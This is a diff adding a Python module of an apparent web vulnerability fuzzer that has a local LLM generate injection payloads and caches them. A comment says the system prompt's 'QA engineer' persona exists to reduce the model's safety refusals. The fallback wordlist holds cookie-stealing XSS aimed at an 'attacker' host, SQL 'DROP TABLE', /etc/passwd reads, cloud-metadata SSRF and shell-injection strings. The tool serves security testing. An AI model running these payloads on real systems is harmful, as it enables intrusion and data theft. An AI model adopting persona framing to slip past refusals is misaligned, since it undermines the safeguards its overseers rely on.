@@ -1,0 +1,546 @@
+"""
+AHVF — Module 3: AI Payload Orchestrator (FR-05)
+==================================================
+Implements FR-05.1 through FR-05.7:
+  FR-05.1  Batch schemas into LLM requests (configurable batch size)
+  FR-05.2  System prompt enforces structured JSON response format
+  FR-05.3  Request second-order injection payloads (stored XSS/SQLi)
+  FR-05.4  Request polyglot payloads for dual SQL+HTML contexts
+  FR-05.5  SSTI payloads for file upload filename parameters
+  FR-05.6  Validate LLM JSON response against expected schema
+  FR-05.7  After cache population, AI connection is terminated
+
+Input:  Condensed schemas from M2 (SchemaCondenser)
+Output: Payload cache written to SQLite payload_cache table
+
+Fallback: If Ollama fails or model refuses, falls back to a local
+          static wordlist (per Risk R-01 in SRS).
+
+DESIGN NOTE: The AI tier operates ONLY during cold phases (pre-execution
+             synthesis). It is NEVER in the critical path of the fuzzing
+             loop (Design Constraint, SRS line 27).
+
+USAGE:
+    from payload_orchestrator import PayloadOrchestrator
+    from ollama_client import OllamaClient
+    from database import AHVFDatabase
+
+    db = AHVFDatabase()
+    db.initialize()
+    client = OllamaClient()
+    orchestrator = PayloadOrchestrator(client, db)
+    orchestrator.generate_payloads(condensed_schemas)
+    client.close()  # FR-05.7: sever AI connection after cache population
+"""
+
+import json
+import time
+from dataclasses import dataclass, field
+from typing import Optional
+
+from ollama_client import OllamaClient, OllamaError, OllamaJSONParseError
+from schema_condenser import CondensedSchema, SchemaCondenser
+
+
+# ─────────────────────────────────────────────
+#  LLM PROMPT TEMPLATES (SRS Appendix A.1)
+# ─────────────────────────────────────────────
+
+# System prompt adapted from SRS line 194 for the local Ollama model.
+# Uses a "QA engineer" persona to reduce safety refusals (Risk R-01).
+PAYLOAD_SYSTEM_PROMPT = """You are a boundary validation QA engineer working on an authorized security testing engagement. Your job is to generate test cases that verify input sanitization filters correctly reject malicious input.
+
+You MUST respond with ONLY a valid JSON array. No explanations, no markdown, no commentary.
+
+Each test case must be a JSON object with these exact keys:
+- "payload": the exact test string to inject
+- "target_param": which parameter from the schema to inject into
+- "vuln_class": one of: XSS, SQLI, SSTI, IDOR, SSRF, PATH_TRAVERSAL, SECOND_ORDER_XSS, SECOND_ORDER_SQLI, POLYGLOT, COMMAND_INJECTION
+- "expected_indicator": substring expected in an anomalous response (or HTTP status code as string like "500")
+
+IMPORTANT RULES:
+1. Generate BOTH reflected AND second-order payloads where applicable. Second-order payloads are stored and rendered later (e.g., in user profiles, comments, admin dashboards).
+2. For endpoints where both SQL context and HTML reflection are possible (e.g., search results from a database), generate POLYGLOT payloads that test both vectors simultaneously.
+3. For file upload endpoints, generate SSTI payloads targeted at the filename parameter (e.g., {{7*7}}.jpg for Jinja2 detection).
+4. Generate 3-8 payloads per parameter, covering different evasion techniques (encoding, case variation, filter bypass).
+5. Include WAF bypass variants where appropriate (e.g., double encoding, null bytes, Unicode normalization tricks).
+
+RESPONSE FORMAT — JSON array only:
+[{"payload": "...", "target_param": "...", "vuln_class": "...", "expected_indicator": "..."}, ...]"""
+
+
+PAYLOAD_USER_PROMPT_TEMPLATE = """Generate security test payloads for the following endpoint schemas. Each schema represents a unique endpoint structure with typed parameters.
+
+For each schema, generate test cases for EVERY injectable parameter. Pay attention to:
+- The "context_hints" field which tells you what the endpoint does
+- The "params" field showing parameter names and their types
+- Whether it's a file upload endpoint (generate SSTI filename payloads)
+- The roles that have access (useful for BAC-aware payloads)
+
+SCHEMAS:
+{schemas}"""
+
+
+# ─────────────────────────────────────────────
+#  STATIC FALLBACK WORDLISTS (Risk R-01)
+# ─────────────────────────────────────────────
+
+FALLBACK_PAYLOADS = {
+    "XSS": [
+        {"payload": "<script>alert(1)</script>", "expected_indicator": "<script>alert(1)</script>"},
+        {"payload": "<img src=x onerror=alert(1)>", "expected_indicator": "onerror="},
+        {"payload": "'\"><svg/onload=alert(1)>", "expected_indicator": "onload="},
+        {"payload": "javascript:alert(1)", "expected_indicator": "javascript:"},
+        {"payload": "<details/open/ontoggle=alert(1)>", "expected_indicator": "ontoggle="},
+    ],
+    "SQLI": [
+        {"payload": "' OR '1'='1", "expected_indicator": "500"},
+        {"payload": "1' AND SLEEP(5)--", "expected_indicator": "500"},
+        {"payload": "' UNION SELECT NULL,NULL--", "expected_indicator": "500"},
+        {"payload": "1; DROP TABLE test--", "expected_indicator": "500"},
+        {"payload": "' OR 1=1#", "expected_indicator": "500"},
+    ],
+    "SSTI": [
+        {"payload": "{{7*7}}", "expected_indicator": "49"},
+        {"payload": "${7*7}", "expected_indicator": "49"},
+        {"payload": "{{config}}", "expected_indicator": "SECRET"},
+        {"payload": "<%= 7*7 %>", "expected_indicator": "49"},
+    ],
+    "PATH_TRAVERSAL": [
+        {"payload": "../../../../etc/passwd", "expected_indicator": "root:"},
+        {"payload": "..\\..\\..\\..\\windows\\system32\\config\\sam", "expected_indicator": "500"},
+        {"payload": "....//....//etc/passwd", "expected_indicator": "root:"},
+        {"payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "expected_indicator": "root:"},
+    ],
+    "SSRF": [
+        {"payload": "http://127.0.0.1:80", "expected_indicator": "200"},
+        {"payload": "http://169.254.169.254/latest/meta-data/", "expected_indicator": "ami-id"},
+        {"payload": "http://[::1]:80", "expected_indicator": "200"},
+    ],
+    "COMMAND_INJECTION": [
+        {"payload": "; ls -la", "expected_indicator": "total"},
+        {"payload": "| cat /etc/passwd", "expected_indicator": "root:"},
+        {"payload": "$(whoami)", "expected_indicator": "www-data"},
+        {"payload": "`id`", "expected_indicator": "uid="},
+    ],
+    "SECOND_ORDER_XSS": [
+        {"payload": "<img src=x onerror=fetch('http://attacker/c?='+document.cookie)>", "expected_indicator": "onerror="},
+        {"payload": "'\"><script>document.location='http://attacker/'+document.cookie</script>", "expected_indicator": "<script>"},
+    ],
+    "POLYGLOT": [
+        {"payload": "'-alert(1)-'", "expected_indicator": "alert"},
+        {"payload": "\\';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//", "expected_indicator": "alert"},
+    ],
+}
+
+
+# ─────────────────────────────────────────────
+#  PAYLOAD VALIDATION
+# ─────────────────────────────────────────────
+
+VALID_VULN_CLASSES = {
+    "XSS", "SQLI", "SSTI", "IDOR", "SSRF", "PATH_TRAVERSAL",
+    "SECOND_ORDER_XSS", "SECOND_ORDER_SQLI", "POLYGLOT",
+    "COMMAND_INJECTION", "OPEN_REDIRECT",
+}
+
+REQUIRED_PAYLOAD_KEYS = {"payload", "target_param", "vuln_class", "expected_indicator"}
+
+
+def _validate_payload(payload_dict: dict) -> bool:
+    """
+    Validate a single payload dict against the expected schema (FR-05.6).
+
+    Returns True if valid, False otherwise.
+    """
+    # Check required keys exist
+    if not all(key in payload_dict for key in REQUIRED_PAYLOAD_KEYS):
+        return False
+
+    # Check values are non-empty strings
+    if not payload_dict.get("payload"):
+        return False
+    if not payload_dict.get("target_param"):
+        return False
+    if not payload_dict.get("vuln_class"):
+        return False
+
+    # Vuln class should be one of the known types (lenient — accept unknown too)
+    # Just log a warning for unknown types, don't reject
+    return True
+
+
+# ─────────────────────────────────────────────
+#  PAYLOAD ORCHESTRATOR CLASS
+# ─────────────────────────────────────────────
+
+class PayloadOrchestrator:
+    """
+    Module 3: AI Payload Orchestrator.
+
+    Takes condensed schemas from M2 and generates attack payloads
+    using a local Ollama LLM. Payloads are validated, deduplicated,
+    and stored in the SQLite payload_cache table.
+
+    If the LLM fails or refuses, falls back to static wordlists.
+    After all payloads are generated, the AI connection is severed (FR-05.7).
+    """
+
+    def __init__(self, ollama_client: OllamaClient, db=None, batch_size: int = 50):
+        """
+        Args:
+            ollama_client: Configured OllamaClient instance.
+            db: AHVFDatabase instance for writing to payload_cache.
+            batch_size: Max schemas per LLM request (FR-05.1, default 50).
+        """
+        self.client = ollama_client
+        self.db = db
+        self.batch_size = batch_size
+        self._total_generated = 0
+        self._total_fallback = 0
+        self._total_invalid = 0
+
+    def generate_payloads(self, schemas: list[CondensedSchema]) -> list[dict]:
+        """
+        Main entry point: generate payloads for all condensed schemas.
+
+        Steps:
+          1. Format schemas into LLM-ready batches (FR-05.1)
+          2. Send each batch to Ollama for payload generation
+          3. Validate returned payloads (FR-05.6)
+          4. Fall back to static wordlists for failed batches (R-01)
+          5. Write all payloads to SQLite payload_cache (FR-05.7)
+          6. Close AI connection (FR-05.7)
+
+        Returns list of all generated payload dicts.
+        """
+        if not schemas:
+            print("[M3] No schemas to process")
+            return []
+
+        print(f"\n{'='*60}")
+        print(f"  M3: AI Payload Orchestrator")
+        print(f"  Schemas: {len(schemas)} | Batch size: {self.batch_size}")
+        print(f"  Model: {self.client.model}")
+        print(f"{'='*60}\n")
+
+        all_payloads = []
+        start_time = time.time()
+
+        # Format into LLM batches
+        llm_batches = SchemaCondenser.format_for_llm(schemas, self.batch_size)
+        print(f"[M3] Split into {len(llm_batches)} batch(es)")
+
+        # Build schema_hash lookup for associating payloads
+        schema_lookup = {s.schema_hash: s for s in schemas}
+
+        # Process each batch
+        for batch_idx, batch_json in enumerate(llm_batches, 1):
+            print(f"\n[M3] Processing batch {batch_idx}/{len(llm_batches)}...")
+
+            # Parse the batch to extract schema hashes for this batch
+            batch_schemas = json.loads(batch_json)
+            batch_hashes = [s["schema_hash"] for s in batch_schemas]
+
+            # Try LLM generation
+            batch_payloads = self._generate_batch_llm(batch_json, batch_hashes, schema_lookup)
+
+            if batch_payloads:
+                all_payloads.extend(batch_payloads)
+            else:
+                # Fallback to static wordlists for the entire batch
+                print(f"[M3] LLM failed for batch {batch_idx}, using fallback wordlists")
+                fallback = self._generate_batch_fallback(batch_hashes, schema_lookup)
+                all_payloads.extend(fallback)
+
+        # Write to SQLite
+        if self.db and all_payloads:
+            self.db.insert_payloads(all_payloads)
+
+        # Also write to JSON for inspection
+        self._write_payload_json(all_payloads)
+
+        elapsed = time.time() - start_time
+        self._print_summary(all_payloads, elapsed)
+
+        return all_payloads
+
+    # ── LLM Generation ───────────────────────────────────────────
+
+    def _generate_batch_llm(
+        self,
+        batch_json: str,
+        batch_hashes: list[str],
+        schema_lookup: dict[str, CondensedSchema],
+    ) -> Optional[list[dict]]:
+        """
+        Send a batch of schemas to Ollama and parse the response.
+
+        Returns list of validated payload dicts, or None if generation failed.
+        """
+        user_prompt = PAYLOAD_USER_PROMPT_TEMPLATE.format(schemas=batch_json)
+
+        try:
+            response = self.client.generate_json(
+                system_prompt=PAYLOAD_SYSTEM_PROMPT,
+                user_prompt=user_prompt,
+                temperature=0.3,  # Low temp for consistent structured output
+            )
+        except OllamaError as e:
+            print(f"[M3] Ollama generation failed: {e}")
+            return None
+
+        # Response should be a list of payload dicts
+        if not isinstance(response, list):
+            # Sometimes models wrap the array in an object
+            if isinstance(response, dict):
+                # Try common wrapper keys
+                for key in ("payloads", "test_cases", "results", "data"):
+                    if key in response and isinstance(response[key], list):
+                        response = response[key]
+                        break
+                else:
+                    print(f"[M3] Unexpected response structure: {type(response)}")
+                    return None
+            else:
+                print(f"[M3] Unexpected response type: {type(response)}")
+                return None
+
+        # Validate each payload (FR-05.6)
+        validated = []
+        for payload_dict in response:
+            if not isinstance(payload_dict, dict):
+                self._total_invalid += 1
+                continue
+
+            if _validate_payload(payload_dict):
+                # Associate with a schema_hash
+                target_param = payload_dict.get("target_param", "")
+
+                # Try to match the payload to a specific schema
+                matched_hash = self._match_payload_to_schema(
+                    target_param, batch_hashes, schema_lookup
+                )
+
+                payload_record = {
+                    "schema_hash": matched_hash or (batch_hashes[0] if batch_hashes else ""),
+                    "vuln_class": payload_dict.get("vuln_class", "UNKNOWN"),
+                    "payload": payload_dict["payload"],
+                    "target_param": target_param,
+                    "expected_indicator": payload_dict.get("expected_indicator", ""),
+                }
+                validated.append(payload_record)
+                self._total_generated += 1
+            else:
+                self._total_invalid += 1
+                print(f"[M3] Skipped invalid payload: {payload_dict}")
+
+        if validated:
+            print(f"[M3] LLM returned {len(response)} payloads, {len(validated)} valid")
+            return validated
+        else:
+            print(f"[M3] All {len(response)} LLM payloads were invalid")
+            return None
+
+    def _match_payload_to_schema(
+        self,
+        target_param: str,
+        batch_hashes: list[str],
+        schema_lookup: dict[str, CondensedSchema],
+    ) -> Optional[str]:
+        """
+        Match a payload's target_param to the most relevant schema.
+
+        Looks through all schemas in the current batch and finds
+        one whose params contain the target_param.
+        """
+        for h in batch_hashes:
+            schema = schema_lookup.get(h)
+            if schema and target_param in schema.params:
+                return h
+            # Also check form fields
+            if schema and target_param in schema.form_fields:
+                return h
+        return None
+
+    # ── Fallback Generation (Risk R-01) ──────────────────────────
+
+    def _generate_batch_fallback(
+        self,
+        batch_hashes: list[str],
+        schema_lookup: dict[str, CondensedSchema],
+    ) -> list[dict]:
+        """
+        Generate payloads from static wordlists when the LLM fails.
+
+        For each schema in the batch, generates basic payloads
+        for each injectable parameter based on parameter type
+        and context hints.
+        """
+        payloads = []
+
+        for schema_hash in batch_hashes:
+            schema = schema_lookup.get(schema_hash)
+            if not schema:
+                continue
+
+            # Determine which vuln classes to test based on context
+            vuln_classes = self._select_vuln_classes(schema)
+
+            for param_name in schema.params.keys():
+                for vuln_class in vuln_classes:
+                    class_payloads = FALLBACK_PAYLOADS.get(vuln_class, [])
+                    for p in class_payloads:
+                        payloads.append({
+                            "schema_hash": schema_hash,
+                            "vuln_class": vuln_class,
+                            "payload": p["payload"],
+                            "target_param": param_name,
+                            "expected_indicator": p["expected_indicator"],
+                        })
+                        self._total_fallback += 1
+
+            # SSTI payloads for file upload filenames (FR-05.5)
+            if schema.is_file_upload:
+                for p in FALLBACK_PAYLOADS.get("SSTI", []):
+                    payloads.append({
+                        "schema_hash": schema_hash,
+                        "vuln_class": "SSTI",
+                        "payload": f"{p['payload']}.jpg",
+                        "target_param": "filename",
+                        "expected_indicator": p["expected_indicator"],
+                    })
+                    self._total_fallback += 1
+
+        return payloads
+
+    def _select_vuln_classes(self, schema: CondensedSchema) -> list[str]:
+        """
+        Select which vulnerability classes to test based on
+        the schema's context hints and parameters.
+        """
+        classes = ["XSS", "SQLI"]  # Always test these
+
+        hints_str = " ".join(schema.context_hints).lower()
+
+        if "file" in hints_str or "upload" in hints_str:
+            classes.extend(["SSTI", "PATH_TRAVERSAL"])
+        if "search" in hints_str:
+            classes.append("POLYGLOT")
+        if "redirect" in hints_str or "callback" in hints_str or "url" in hints_str:
+            classes.append("SSRF")
+        if "export" in hints_str or "download" in hints_str:
+            classes.append("PATH_TRAVERSAL")
+        if "command" in hints_str or "exec" in hints_str or "run" in hints_str:
+            classes.append("COMMAND_INJECTION")
+
+        # Check param types for additional vectors
+        for param_name, param_type in schema.params.items():
+            name_lower = param_name.lower()
+            if "url" in name_lower or "link" in name_lower or "redirect" in name_lower:
+                if "SSRF" not in classes:
+                    classes.append("SSRF")
+            if "file" in name_lower or "path" in name_lower or "dir" in name_lower:
+                if "PATH_TRAVERSAL" not in classes:
+                    classes.append("PATH_TRAVERSAL")
+            if "cmd" in name_lower or "command" in name_lower or "exec" in name_lower:
+                if "COMMAND_INJECTION" not in classes:
+                    classes.append("COMMAND_INJECTION")
+
+        return list(set(classes))  # Deduplicate
+
+    # ── Output ───────────────────────────────────────────────────
+
+    def _write_payload_json(self, payloads: list[dict]):
+        """Write payloads to a JSON file for inspection."""
+        from pathlib import Path
+
+        output_path = Path("results") / "payload_cache.json"
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+
+        output_path.write_text(
+            json.dumps(payloads, indent=2, ensure_ascii=False),
+            encoding="utf-8",
+        )
+        print(f"[M3] Payload cache written to {output_path}")
+
+    def _print_summary(self, payloads: list[dict], elapsed: float):
+        """Print a summary of the payload generation run."""
+        from collections import Counter
+
+        print(f"\n{'='*60}")
+        print(f"  M3: Payload Orchestrator — Summary")
+        print(f"{'='*60}")
+        print(f"  Total payloads generated  : {len(payloads)}")
+        print(f"    ├─ From LLM             : {self._total_generated}")
+        print(f"    ├─ From fallback lists   : {self._total_fallback}")
+        print(f"    └─ Invalid (discarded)   : {self._total_invalid}")
+        print(f"  Time elapsed              : {elapsed:.1f}s")
+
+        if payloads:
+            # Vuln class distribution
+            vuln_counts = Counter(p.get("vuln_class", "UNKNOWN") for p in payloads)
+            print(f"\n  Vulnerability class distribution:")
+            for vuln_class, count in vuln_counts.most_common():
+                print(f"    {vuln_class:25s} : {count}")
+
+            # Schema coverage
+            schema_hashes = set(p.get("schema_hash", "") for p in payloads)
+            print(f"\n  Schema coverage           : {len(schema_hashes)} schema(s)")
+
+        print(f"{'='*60}\n")
+
+
+# ─────────────────────────────────────────────
+#  STANDALONE TEST
+# ─────────────────────────────────────────────
+
+if __name__ == "__main__":
+    from database import AHVFDatabase
+
+    print("\n=== Payload Orchestrator Test ===\n")
+
+    # Initialize DB
+    db = AHVFDatabase()
+    db.initialize()
+
+    # Initialize Ollama client
+    try:
+        client = OllamaClient()
+        client.health_check()
+    except OllamaError as e:
+        print(f"Ollama not available: {e}")
+        print("Proceeding with fallback wordlists only.\n")
+        client = None
+
+    # Load condensed schemas
+    condenser = SchemaCondenser(db)
+    schemas = condenser.condense()
+
+    if not schemas:
+        print("No schemas found. Run the Crawler first, then the Schema Condenser.")
+    else:
+        if client:
+            orchestrator = PayloadOrchestrator(client, db)
+            payloads = orchestrator.generate_payloads(schemas)
+            client.close()  # FR-05.7
+        else:
+            # Fallback-only mode
+            print("Running in fallback-only mode (no LLM)...")
+            orchestrator = PayloadOrchestrator.__new__(PayloadOrchestrator)
+            orchestrator.db = db
+            orchestrator.batch_size = 50
+            orchestrator._total_generated = 0
+            orchestrator._total_fallback = 0
+            orchestrator._total_invalid = 0
+
+            schema_lookup = {s.schema_hash: s for s in schemas}
+            all_hashes = [s.schema_hash for s in schemas]
+            payloads = orchestrator._generate_batch_fallback(all_hashes, schema_lookup)
+
+            if db:
+                db.insert_payloads(payloads)
+            orchestrator._write_payload_json(payloads)
+            orchestrator._print_summary(payloads, 0)
+
+    db.close()
